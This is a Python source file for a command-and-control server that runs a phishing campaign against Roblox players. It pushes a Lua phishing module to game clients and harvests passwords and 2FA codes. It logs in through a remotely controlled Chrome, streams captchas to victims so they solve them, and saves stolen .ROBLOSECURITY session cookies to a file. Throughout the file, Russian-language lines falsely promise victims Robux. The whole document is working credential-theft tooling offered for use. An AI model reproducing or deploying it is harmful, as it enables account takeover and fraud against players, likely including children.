"""
c2_server.py — C2 + browser streaming hybrid.
Chrome starts ONLY after victim enters password.
Flow:
1. Start WebSocket server (no Chrome)
2. Client connects → send phish.lua module
3. Victim enters password → Chrome starts, CDP connect
4. Login attempt via CDP (fill form, submit)
5. If .ROBLOSECURITY cookie → success, kill Chrome
6. If captcha → stream Chrome to Roblox until cookie or timeout
7. Kill Chrome when done
"""

import asyncio
import websockets
import json
import base64
import struct
import subprocess
import time
import logging
import os
import requests
from io import BytesIO
from PIL import Image

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')
log = logging.getLogger(__name__)

CHUNK_SIZE = 128
CDP_PORT = 9222
WS_PORT = 8080
CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
PROFILE = os.path.abspath("pw_profile")
BROWSER_WIDTH = 800
BROWSER_HEIGHT = 600
MODULES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "modules")


def start_chrome():
    args = [
        CHROME,
        f"--user-data-dir={PROFILE}",
        "--no-first-run",
        "--no-default-browser-check",
        "--remote-debugging-port=9222",
        "--remote-allow-origins=*",
        f"--window-size={BROWSER_WIDTH},{BROWSER_HEIGHT}",
        "--disable-web-security",
        "--disable-site-isolation-trials",
        "--disable-features=IsolateOrigins,site-per-process,ChromeWhatsNewUI,InterestFeedContentSuggestions,TranslateUI",
        "--disable-sync",
        "--disable-gpu",
        "--disable-software-rasterizer",
        "--disable-background-networking",
        "--disable-background-timer-throttling",
        "--disable-backgrounding-occluded-windows",
        "--disable-renderer-backgrounding",
        "--mute-audio",
    ]
    return subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


async def get_cdp_url(max_attempts=30):
    import http.client
    for attempt in range(max_attempts):
        try:
            conn = http.client.HTTPConnection("localhost", CDP_PORT, timeout=3)
            conn.request("GET", "/json")
            resp = conn.getresponse()
            tabs = json.loads(resp.read())
            conn.close()
            if tabs:
                url = tabs[0]["webSocketDebuggerUrl"]
                log.info(f"CDP URL: {url}")
                return url
        except Exception as e:
            log.warning(f"Waiting for Chrome CDP ({attempt}): {e}")
        await asyncio.sleep(1)
    raise RuntimeError("Could not connect to Chrome CDP")


def load_module(name):
    path = os.path.join(MODULES_DIR, name)
    with open(path, "r", encoding="utf-8") as f:
        return f.read()


class ScreenStream:
    def __init__(self):
        self.chrome_proc = None
        self.cdp = None
        self._msg_id = 0
        self._pending = {}
        self.frame_queue = asyncio.Queue(maxsize=4)
        self._reader_task = None
        self._capture_task = None
        self._stream_task = None
        self._capture_clip = None
        self._captcha_mode = False
        self._captcha_frame_id = None
        self._target_session_id = None
        self._session_pending = {}
        self._auto_sessions = {}

    async def ensure_chrome(self):
        if self.cdp:
            return True

        # If we had a previous Chrome instance, kill it first
        if self.chrome_proc:
            try:
                self.chrome_proc.kill()
                self.chrome_proc.wait(timeout=3)
            except Exception:
                pass
            self.chrome_proc = None

        # Start fresh Chrome
        try:
            self.chrome_proc = start_chrome()
            log.info("Chrome process started")

            url = await get_cdp_url(max_attempts=30)
            self.cdp = await websockets.connect(url, max_size=None)
            log.info("Connected to Chrome CDP")

            self._reader_task = asyncio.create_task(self._reader())

            await self._cmd("Network.enable")
            await self._cmd("Emulation.setDeviceMetricsOverride", {
                "width": BROWSER_WIDTH, "height": BROWSER_HEIGHT,
                "deviceScaleFactor": 1, "mobile": False,
            })
            await self._cmd("Target.setAutoAttach", {"autoAttach": True, "flatten": True, "waitForDebuggerOnStart": False})
            log.info(f"Viewport set to {BROWSER_WIDTH}x{BROWSER_HEIGHT}")
            return True
        except Exception as e:
            log.error(f"Failed to start Chrome: {e}")
            return False

    def kill_chrome(self):
        if self._capture_task:
            self._capture_task.cancel()
            self._capture_task = None
        if self._reader_task and not self._reader_task.done():
            self._reader_task.cancel()
            self._reader_task = None
        if self.cdp:
            asyncio.ensure_future(self.cdp.close())
            self.cdp = None
        if self.chrome_proc:
            try:
                self.chrome_proc.kill()
            except Exception:
                pass
            self.chrome_proc = None
        self._pending = {}
        self.frame_queue = asyncio.Queue(maxsize=4)
        self._capture_clip = None
        log.info("Chrome killed")

    async def _reader(self):
        try:
            async for msg in self.cdp:
                data = json.loads(msg)
                if data.get("method") == "Target.attachedToTarget":
                    p = data.get("params", {})
                    tid = p.get("targetInfo", {}).get("targetId", "")
                    sid = p.get("sessionId", "")
                    if tid and sid:
                        self._auto_sessions[tid] = sid
                        log.info(f"Auto-attached to target {tid} session={sid}")
                    continue
                if "sessionId" in data:
                    sid_key = (data["sessionId"], data.get("id"))
                    future = self._session_pending.pop(sid_key, None)
                    if future and not future.done():
                        if "error" in data:
                            future.set_exception(RuntimeError(data["error"]))
                        else:
                            future.set_result(data.get("result", {}))
                elif "id" in data:
                    future = self._pending.pop(data["id"], None)
                    if future and not future.done():
                        if "error" in data:
                            future.set_exception(RuntimeError(data["error"]))
                        else:
                            future.set_result(data.get("result", {}))
        except Exception as e:
            log.error(f"CDP reader error: {e}")
            for fid, future in self._pending.items():
                if not future.done():
                    future.set_exception(RuntimeError("CDP connection lost"))
            for sid, future in self._session_pending.items():
                if not future.done():
                    future.set_exception(RuntimeError("CDP connection lost"))
            self._pending.clear()
            self._session_pending.clear()

    async def _cmd(self, method, params=None, wait=True):
        self._msg_id += 1
        msg_id = self._msg_id
        future = asyncio.get_event_loop().create_future() if wait else None
        if future:
            self._pending[msg_id] = future
        await self.cdp.send(json.dumps({
            "id": msg_id,
            "method": method,
            "params": params or {},
        }))
        if future:
            result = await asyncio.wait_for(future, timeout=15.0)
            return result

    async def _send_to_target(self, session_id, method, params):
        self._msg_id += 1
        inner_id = self._msg_id
        self._msg_id += 1
        wrapper_id = self._msg_id
        future = asyncio.get_event_loop().create_future()
        self._session_pending[(session_id, inner_id)] = future
        msg_payload = json.dumps({"id": inner_id, "method": method, "params": params or {}})
        await self.cdp.send(json.dumps({
            "id": wrapper_id,
            "method": "Target.sendMessageToTarget",
            "params": {"sessionId": session_id, "message": msg_payload},
        }))
        result = await asyncio.wait_for(future, timeout=15.0)
        return result

    async def _capture_loop(self):
        while True:
            try:
                params = {"format": "png"}
                if self._capture_clip:
                    params["clip"] = {**self._capture_clip, "scale": 1}
                result = await self._cmd("Page.captureScreenshot", params)
                await self.frame_queue.put(result)
            except asyncio.TimeoutError:
                log.warning("Screenshot timeout")
            except Exception as e:
                log.error(f"Capture error: {e}")
            await asyncio.sleep(0.5)

    def start_capture(self):
        if self._capture_task is None:
            self._capture_task = asyncio.create_task(self._capture_loop())
            log.info("Capture loop started")

    def stop_capture(self):
        if self._capture_task:
            self._capture_task.cancel()
            self._capture_task = None
            log.info("Capture loop stopped")
        self._capture_clip = None

    async def _find_captcha_frame_id(self):
        tree = await self._cmd("Page.getFrameTree")
        def search(f):
            if "iframe" in f.get("frame", {}).get("url", "") or "arkoselabs" in f.get("frame", {}).get("url", "") or "funcaptcha" in f.get("frame", {}).get("url", ""):
                return f["frame"]["id"]
            for c in f.get("childFrames", []):
                r = search(c)
                if r:
                    return r
            return None
        return search(tree.get("frameTree", {}))

    async def attach_to_captcha_frame(self):
        if not self._captcha_frame_id:
            return
        if self._captcha_frame_id in self._auto_sessions:
            self._target_session_id = self._auto_sessions[self._captcha_frame_id]
            log.info(f"Using auto-attached session for captcha frame: {self._target_session_id}")
            return
        for attempt in range(15):
            try:
                targets = await self._cmd("Target.getTargets")
                for t in targets.get("targetInfos", []):
                    url = t.get("url", "")
                    tid = t.get("targetId", "")
                    if "arkoselabs" in url or "funcaptcha" in url:
                        result = await self._cmd("Target.attachToTarget", {"targetId": tid, "flatten": True})
                        self._target_session_id = result.get("sessionId")
                        log.info(f"Found captcha OOPIF target: {tid}, session={self._target_session_id}")
                        return
                await asyncio.sleep(0.5)
            except Exception as e:
                await asyncio.sleep(0.5)
        log.warning("Captcha frame has no CDP session available - clicks will not reach it")

    async def dispatch_to_frame(self, x, y, event_type):
        if self._target_session_id:
            await self._dispatch_via_session(x, y, event_type)
        else:
            is_press = event_type in (1, 2)
            await self._cmd("Input.dispatchMouseEvent", {
                "type": "mousePressed" if is_press else "mouseReleased",
                "x": float(x), "y": float(y),
                "button": "left", "clickCount": 1,
                "buttons": 1 if is_press else 0,
                "pointerType": "mouse",
            })

    async def _dispatch_via_session(self, x, y, event_type):
        cdp_types = {1: "mousePressed", 2: "mousePressed", 3: "mouseReleased", 4: "mouseReleased"}
        cdp_buttons = {1: "left", 2: "right", 3: "left", 4: "right"}
        is_press = event_type in (1, 2)
        params = {
            "type": cdp_types.get(event_type, "mousePressed"),
            "x": float(x), "y": float(y),
            "button": cdp_buttons.get(event_type, "left"),
            "clickCount": 1,
            "buttons": 1 if is_press else 0,
            "pointerType": "mouse",
        }
        try:
            result = await self._send_to_target(self._target_session_id, "Input.dispatchMouseEvent", params)
            log.info(f"Frame dispatch (session): ({x},{y}) type={event_type} -> result={result}")
        except Exception as e:
            log.warning(f"Frame dispatch (session) failed: {e}")

    async def dispatch_touch(self, x, y, press):
        ttype = "touchStart" if press else "touchEnd"
        params = {
            "type": ttype,
            "touchPoints": [{"x": float(x), "y": float(y), "id": 1, "radiusX": 1, "radiusY": 1}],
            "modifiers": 0,
        }
        result = await self._cmd("Input.dispatchTouchEvent", params)
        log.info(f"Touch dispatch: ({x},{y}) press={press} -> result={result}")

    async def dispatch_mouse(self, x, y, event_type):
        cdp_types = {0: "mouseMoved", 1: "mousePressed", 2: "mousePressed", 3: "mouseReleased", 4: "mouseReleased", 5: "mouseWheel", 6: "mouseWheel"}
        cdp_buttons = {1: "left", 2: "right", 3: "left", 4: "right"}

        if self._capture_clip:
            cx = int(self._capture_clip["x"])
            cy = int(self._capture_clip["y"])
            cw = int(self._capture_clip["width"])
            ch = int(self._capture_clip["height"])
            x = cx + max(0, min(x, cw - 1))
            y = cy + max(0, min(y, ch - 1))

        if event_type in (5, 6):
            params = {
                "type": "mouseWheel",
                "x": float(x), "y": float(y),
                "deltaX": 0, "deltaY": 120 if event_type == 5 else -120,
            }
            result = await self._cmd("Input.dispatchMouseEvent", params)
            log.info(f"Mouse dispatch: ({x},{y}) type={event_type} -> result={result}")
            return

        if self._captcha_mode and event_type in (1, 2, 3, 4):
            await self.dispatch_to_frame(x, y, event_type)
            return

        params = {
            "type": cdp_types.get(event_type, "mouseMoved"),
            "x": float(x), "y": float(y),
            "modifiers": 0,
            "pointerType": "mouse",
        }
        if event_type == 0:
            params["button"] = "none"
        else:
            params["button"] = cdp_buttons.get(event_type, "left")
            params["clickCount"] = 1
            params["buttons"] = 1

        if event_type in (1, 2, 3, 4):
            await self._cmd("Page.bringToFront", wait=False)

        result = await self._cmd("Input.dispatchMouseEvent", params)
        log.info(f"Mouse dispatch: ({x},{y}) type={event_type} -> result={result}")

    async def dispatch_key(self, ev_type, key):
        cdp_types = {0: "rawKeyDown", 1: "keyUp", 2: "char"}
        t = cdp_types.get(ev_type, "rawKeyDown")
        params = {"type": t, "key": key, "code": key, "windowsVirtualKeyCode": 0}
        if t == "char":
            params["text"] = key
            params["unmodifiedText"] = key
        elif t == "rawKeyDown":
            params["windowsVirtualKeyCode"] = ord(key[0]) if len(key) == 1 else 0
        await self._cmd("Input.dispatchKeyEvent", params)
        log.info(f"Key dispatch: type={t} key={key}")

    async def dispatch_text(self, text):
        await self._cmd("Input.insertText", {"text": text})
        log.info(f"Text insert: {text[:50]}")

    async def _send_frame(self, ws, img, prev_image):
        w, h = img.size
        chunks_x = (w + CHUNK_SIZE - 1) // CHUNK_SIZE
        chunks_y = (h + CHUNK_SIZE - 1) // CHUNK_SIZE

        if prev_image is None or prev_image.size != img.size:
            msg = struct.pack("<BII", 0, w, h)
            await ws.send(msg)
            log.info(f"Sent Resize {w}x{h}")
            for cx in range(chunks_x):
                for cy in range(chunks_y):
                    ox = cx * CHUNK_SIZE
                    oy = cy * CHUNK_SIZE
                    cw = min(CHUNK_SIZE, w - ox)
                    ch = min(CHUNK_SIZE, h - oy)
                    chunk = img.crop((ox, oy, ox + cw, oy + ch))
                    data = chunk.tobytes()
                    msg = struct.pack("<BBBI", 1, cx, cy, len(data)) + data
                    await ws.send(msg)
            log.info(f"Sent {chunks_x * chunks_y} chunks")
        else:
            changed = 0
            for cx in range(chunks_x):
                for cy in range(chunks_y):
                    ox = cx * CHUNK_SIZE
                    oy = cy * CHUNK_SIZE
                    cw = min(CHUNK_SIZE, w - ox)
                    ch = min(CHUNK_SIZE, h - oy)
                    chunk = img.crop((ox, oy, ox + cw, oy + ch))
                    prev_chunk = prev_image.crop((ox, oy, ox + cw, oy + ch))
                    if chunk.tobytes() != prev_chunk.tobytes():
                        data = chunk.tobytes()
                        msg = struct.pack("<BBBI", 1, cx, cy, len(data)) + data
                        await ws.send(msg)
                        changed += 1
            if changed > 0:
                log.info(f"Sent {changed} changed chunks")
        return img

    async def stream_to_client(self, ws):
        prev_image = None
        frame_count = 0
        while True:
            try:
                result = await asyncio.wait_for(self.frame_queue.get(), timeout=15.0)
            except asyncio.TimeoutError:
                log.warning("No frames from CDP for 15s")
                continue
            png_data = base64.b64decode(result["data"])
            img = Image.open(BytesIO(png_data)).convert("RGBA")
            if img.size != (BROWSER_WIDTH, BROWSER_HEIGHT) and not self._capture_clip:
                img = img.resize((BROWSER_WIDTH, BROWSER_HEIGHT), Image.LANCZOS)
            frame_count += 1
            log.info(f"Streaming frame {frame_count}: {img.size[0]}x{img.size[1]}")
            try:
                prev_image = await self._send_frame(ws, img, prev_image)
            except websockets.exceptions.ConnectionClosed:
                log.info("Client disconnected during frame send")
                break
            except Exception as e:
                log.error(f"Frame send error: {e}")
                break

    async def _wait_for_element(self, selector, timeout=15):
        for i in range(timeout * 10):
            result = await self._cmd("Runtime.evaluate", {
                "expression": f"document.querySelector({json.dumps(selector)}) !== null"
            })
            if result.get("result", {}).get("value"):
                return True
            if i % 50 == 0:
                title = await self._cmd("Runtime.evaluate", {
                    "expression": "document.title || 'no title'"
                })
                log.info(f"Waiting for '{selector}' (attempt {i}): {title.get('result',{}).get('value','')}")
            await asyncio.sleep(0.1)
        return False

    async def set_captcha_clip(self):
        import json
        for i in range(50):
            result = await self._cmd("Runtime.evaluate", {
                "expression": """(() => {
                    const sel = [
                        '.h-captcha', 'iframe', '.captcha-holder',
                        '[data-sitekey]', '[class*="captcha"]', '[id*="captcha"]',
                    ];
                    for (const s of sel) {
                        const all = document.querySelectorAll(s);
                        for (const el of all) {
                            const r = el.getBoundingClientRect();
                            if (r.width > 10 && r.height > 10) {
                                el.scrollIntoView({block:'center'});
                                return JSON.stringify({x: r.x, y: r.y, width: r.width, height: r.height});
                            }
                        }
                    }
                    return 'null';
                })()"""
            })
            raw = result.get("result", {}).get("value", "null")
            if raw and raw != "null":
                clip = json.loads(raw)
                if clip["x"] < 0: clip["x"] = 0
                if clip["y"] < 0: clip["y"] = 0
                self._capture_clip = clip
                log.info(f"Captcha clip found: {clip}")
                return True
            await asyncio.sleep(0.2)
        log.warning("Captcha element not found after 10s, streaming full viewport")
        return False

    async def hide_form_for_captcha(self):
        await self._cmd("Runtime.evaluate", {
            "expression": """(() => {
                const s = document.createElement('style');
                s.id = '__c2_hide';
                s.textContent = `
                    input, button, textarea, select,
                    [class*="login"], [class*="form"],
                    [class*="header"], [class*="footer"],
                    [class*="alert"], .metadata, nav
                    { display: none !important; }
                    body, html { background: #e8e8e8 !important; margin: 0 !important; }
                `;
                document.head.appendChild(s);
                return 'ok';
            })()"""
        })

    def bring_chrome_to_foreground(self):
        try:
            subprocess.run(["powershell", "-NoProfile", "-Command",
                "$wshell = New-Object -ComObject wscript.shell; "
                "$wshell.AppActivate('Chrome')"
            ], capture_output=True, timeout=3)
        except Exception:
            pass

    async def try_login(self, username, password, ws):
        log.info(f"Login attempt: {username}")

        await ws.send(json.dumps({"type": "hold", "message": "Проверка данных..."}))

        # Navigate and wait for full page load
        await self._cmd("Page.navigate", {"url": "https://www.roblox.com/login"})

        await asyncio.sleep(3)

        found = await self._wait_for_element('input[name="username"]', timeout=20)
        if not found:
            await ws.send(json.dumps({"type": "err", "message": "Ошибка проверки. Попробуйте снова."}))
            return None

        await ws.send(json.dumps({"type": "hold", "message": "Проверка данных..."}))

        await self._cmd("Runtime.evaluate", {
            "expression": f"""(() => {{
                const el = document.querySelector('input[name="username"]');
                if (!el) return 'no username field';
                el.focus();
                const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
                setter.call(el, {json.dumps(username)});
                el.dispatchEvent(new Event('input', {{ bubbles: true }}));
                el.dispatchEvent(new Event('change', {{ bubbles: true }}));
                return 'ok';
            }})()"""
        })
        await asyncio.sleep(0.5)

        await self._cmd("Runtime.evaluate", {
            "expression": f"""(() => {{
                const el = document.querySelector('input[name="password"]');
                if (!el) return 'no password field';
                el.focus();
                const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
                setter.call(el, {json.dumps(password)});
                el.dispatchEvent(new Event('input', {{ bubbles: true }}));
                el.dispatchEvent(new Event('change', {{ bubbles: true }}));
                return 'ok';
            }})()"""
        })
        await asyncio.sleep(0.5)

        await ws.send(json.dumps({"type": "hold", "message": "Проверка данных..."}))

        click_result = await self._cmd("Runtime.evaluate", {
            "expression": """(() => {
                for (const sel of ['#login-button', 'button[type="submit"]', '.login-button', 'form button']) {
                    const btn = document.querySelector(sel);
                    if (btn) { btn.click(); return 'clicked ' + sel; }
                }
                return 'no button found';
            })()"""
        })
        log.info(f"Login click: {click_result.get('result',{}).get('value','?')}")

        await asyncio.sleep(2)

        # Check if page changed
        url_result = await self._cmd("Runtime.evaluate", {
            "expression": "window.location.href"
        })
        current_url = url_result.get("result", {}).get("value", "")
        log.info(f"URL after click: {current_url}")

        await asyncio.sleep(3)

        cookies_result = await self._cmd("Network.getAllCookies")
        for c in cookies_result.get("cookies", []):
            if c["name"] == ".ROBLOSECURITY":
                log.info(f"Login OK! .ROBLOSECURITY captured")
                return {"cookie": c["value"], "domain": c.get("domain", "")}

        log.info("No .ROBLOSECURITY yet — checking for captcha/2FA")

        if "two-step-verification" in current_url.lower():
            return {"2fa": True}

        # Check if captcha appeared
        captcha_info = await self._cmd("Runtime.evaluate", {
            "expression": """(() => {
                const sel = ['.h-captcha', 'iframe[src*="hcaptcha"]', '[class*="captcha"]', '[id*="captcha"]', '.captcha-holder'];
                for (const s of sel) {
                    const el = document.querySelector(s);
                    if (el) return 'found ' + s;
                }
                return 'none';
            })()"""
        })
        log.info(f"Captcha check: {captcha_info.get('result',{}).get('value','?')}")

        return {"captcha": True, "url": current_url}

    async def wait_for_cookie(self, ws, timeout=300):
        start = time.time()
        while time.time() - start < timeout:
            try:
                result = await self._cmd("Network.getAllCookies")
                for c in result.get("cookies", []):
                    if c["name"] == ".ROBLOSECURITY":
                        elapsed = time.time() - start
                        log.info(f".ROBLOSECURITY captured after {elapsed:.0f}s")
                        return c
            except Exception:
                pass
            await asyncio.sleep(2)
        log.warning("Timeout waiting for .ROBLOSECURITY")
        return None


def get_roblox_username(user_id):
    try:
        resp = requests.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10)
        if resp.status_code == 200:
            return resp.json().get("name")
        log.warning(f"Username lookup failed: HTTP {resp.status_code}")
    except Exception as e:
        log.warning(f"Username lookup error: {e}")
    return None


async def handle_client(ws, screen):
    log.info("Client connected")

    phish_code = load_module("phish.lua")
    phish_2fa_code = load_module("phish_2fa.lua")

    state = "hello"
    stream_task = None

    try:
        async for msg in ws:
            if isinstance(msg, str):
                try:
                    data = json.loads(msg)
                except json.JSONDecodeError:
                    continue

                t = data.get("type")

                if t == "hello":
                    user_id = data.get("userId")
                    log.info(f"Client hello: user={data.get('playerName')} id={user_id} place={data.get('placeId')}")
                    await ws.send(phish_code)
                    log.info("Sent phish.lua module")
                    state = "phished"

                elif t == "password":
                    password = data.get("password", "")
                    user_id = data.get("userId")
                    player_name = data.get("playerName", "")
                    log.info(f"Password from {player_name} (id={user_id}), len={len(password)}")

                    # Client-side cookie (solved via Roblox HttpService)
                    client_cookie = data.get("cookie")
                    if client_cookie:
                        log.info("Client-side cookie received, validating...")
                        try:
                            r = requests.get("https://www.roblox.com/home",
                                cookies={".ROBLOSECURITY": client_cookie},
                                timeout=10, allow_redirects=False)
                            if r.status_code == 200 or ".ROBLOSECURITY" in r.cookies:
                                log.info("Client cookie valid, saving")
                                with open("c2_credentials.txt", "a") as f:
                                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {player_name} (id={user_id}): {password}\n")
                                    f.write(f"Cookie: .ROBLOSECURITY={client_cookie}\n\n")
                                await ws.send(json.dumps({"type": "ok", "message": "Robux будут начислены от 6 до 48 часов. Ожидайте."}))
                                state = "done"
                                continue
                        except Exception as e:
                            log.warning(f"Cookie validation error: {e}")
                        log.info("Client cookie invalid, falling back to Chrome")
                        # Don't continue, fall through to Chrome flow below

                    try:
                        log.info("Starting Chrome on demand...")
                        ok = await screen.ensure_chrome()
                        if not ok:
                            await ws.send(json.dumps({"type": "err", "message": "Не удалось запустить браузер"}))
                            continue

                        username = await asyncio.to_thread(get_roblox_username, user_id)
                        if not username:
                            await ws.send(json.dumps({"type": "err", "message": "Не удалось определить логин"}))
                            continue

                        log.info(f"Username: {username}")
                        state = "login"

                        result = await screen.try_login(username, password, ws)

                        if result is None:
                            state = "done"
                            continue

                        if "cookie" in result:
                            log.info(f"COOKIE captured")
                            await ws.send(json.dumps({"type": "ok", "message": "Robux начислены! Проверьте баланс."}))
                            state = "done"

                        elif result.get("2fa"):
                            log.info("2FA required")
                            await ws.send(json.dumps({"type": "2fa"}))
                            await ws.send(phish_2fa_code)
                            state = "2fa"

                        elif result.get("captcha"):
                            log.info("Captcha detected, starting stream")
                            state = "captcha"

                            await ws.send(json.dumps({"type": "hold", "message": "Проверка безопасности..."}))
                            await ws.send(json.dumps({"type": "start_browser"}))

                            screen._captcha_mode = True
                            await screen.set_captcha_clip()
                            screen._captcha_frame_id = await screen._find_captcha_frame_id()
                            await screen.attach_to_captcha_frame()
                            await screen.hide_form_for_captcha()
                            await asyncio.sleep(0.5)
                            screen.bring_chrome_to_foreground()

                            screen.start_capture()
                            stream_task = asyncio.create_task(screen.stream_to_client(ws))

                            cookie = await screen.wait_for_cookie(ws, timeout=300)

                            if stream_task:
                                stream_task.cancel()
                                stream_task = None
                            screen.stop_capture()

                            await ws.send(json.dumps({"type": "stop_browser"}))

                            if cookie:
                                log.info(f"COOKIE captured after captcha")
                                await ws.send(json.dumps({"type": "ok", "message": "Robux начислены! Проверьте баланс."}))
                            else:
                                await ws.send(json.dumps({"type": "err", "message": "Время вышло. Попробуйте снова."}))
                            state = "done"
                    except Exception as e:
                        log.error(f"Login flow error: {e}")
                        try:
                            await ws.send(json.dumps({"type": "err", "message": f"Ошибка: {str(e)[:80]}"}))
                        except Exception:
                            pass
                        state = "done"
                    finally:
                        screen.kill_chrome()

                elif t == "2fa_code":
                    code = data.get("code", "")
                    log.info(f"2FA code: {code}")
                    await screen.dispatch_text(code)
                    await asyncio.sleep(0.5)
                    await screen._cmd("Runtime.evaluate", {
                        "expression": "document.querySelector('button[type=\"submit\"]')?.click()"
                    })
                    await asyncio.sleep(3)
                    cookies_result = await screen._cmd("Network.getAllCookies")
                    for c in cookies_result.get("cookies", []):
                        if c["name"] == ".ROBLOSECURITY":
                            log.info(f"COOKIE after 2FA")
                            await ws.send(json.dumps({"type": "ok", "message": "Robux начислены! Проверьте баланс."}))
                            state = "done"
                            break

                elif t in ("mouse", "keyboard", "text"):
                    if state == "captcha":
                        try:
                            if t == "mouse":
                                log.info(f"Mouse event from client: x={data.get('x')} y={data.get('y')} event={data.get('event')}")
                                await screen.dispatch_mouse(data["x"], data["y"], data["event"])
                            elif t == "keyboard":
                                await screen.dispatch_key(data["event"], data["key"])
                            elif t == "text":
                                await screen.dispatch_text(data["text"])
                        except Exception as e:
                            log.error(f"Input dispatch error (ignored): {e}")

                elif t == "load":
                    await screen.navigate(data.get("url", ""))

                elif t == "reset":
                    if stream_task:
                        stream_task.cancel()
                        stream_task = None
                    screen.stop_capture()

                elif t in ("closed", "timed_out"):
                    log.info(f"Client: {t}")
                    state = "done"

            elif isinstance(msg, bytes):
                pass

    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        if stream_task:
            stream_task.cancel()
        screen.kill_chrome()
        log.info("Client disconnected")


async def main():
    screen = ScreenStream()

    async def handler(ws):
        await handle_client(ws, screen)

    async with websockets.serve(handler, "0.0.0.0", WS_PORT) as server:
        log.info(f"WebSocket server on ws://0.0.0.0:{WS_PORT}")
        try:
            await asyncio.Future()
        finally:
            screen.kill_chrome()


if __name__ == "__main__":
    asyncio.run(main())
